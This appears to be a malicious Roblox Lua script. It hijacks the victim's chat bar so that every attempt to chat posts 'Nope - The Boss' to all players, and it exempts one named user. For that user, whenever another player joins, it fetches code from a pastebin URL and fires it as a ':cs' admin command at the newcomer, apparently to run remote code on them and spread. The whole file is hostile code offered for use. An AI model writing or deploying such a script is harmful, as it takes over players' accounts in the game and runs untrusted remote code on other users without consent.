if game.Players.LocalPlayer:findFirstChild("Increpted") then
  return
else
  local d = Instance.new("StringValue", game.Players.LocalPlayer)
  d.Name = "Increpted"
end

local scamMsg = "Nope - The Boss"
local chatBar = game.Players.LocalPlayer:findFirstChildOfClass("PlayerGui").Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar

local db = false
chatBar.Focused:Connect(function()
   if game.Players.LocalPlayer.Name == "JhonXD2006" then return end
   if db then return end
   db = true
   chatBar:CaptureFocus()
   game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(scamMsg, "All")
   wait(0.1)
   chatBar:ReleaseFocus()
   chatBar.Text = ""
   db = false
end)

game:GetService("Players").PlayerAdded:Connect(function(plr)
   if game.Players.LocalPlayer.Name == "JhonXD2006" then
      local asdf = require(game.Players.LocalPlayer.PlayerScripts.ChatScript.ChatMain)
      asdf.MessagePosted:fire(":cs "..plr.Name.." "..game:GetService("HttpService"):GetAsync("https://pastebin.com/raw/csE9q88i"));
   end
end)